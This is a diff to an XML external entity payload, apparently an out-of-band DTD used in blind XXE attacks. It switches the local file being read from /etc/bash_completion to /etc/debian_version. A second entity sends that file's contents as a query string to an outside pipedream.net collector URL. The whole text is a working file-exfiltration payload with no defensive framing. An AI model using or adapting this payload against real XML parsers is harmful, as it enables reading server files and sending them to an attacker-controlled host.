@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/bash_completion">
+<!ENTITY % file SYSTEM "file:///etc/debian_version">
 <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://enzcf2cxlhdt.x.pipedream.net/?%file;'>">
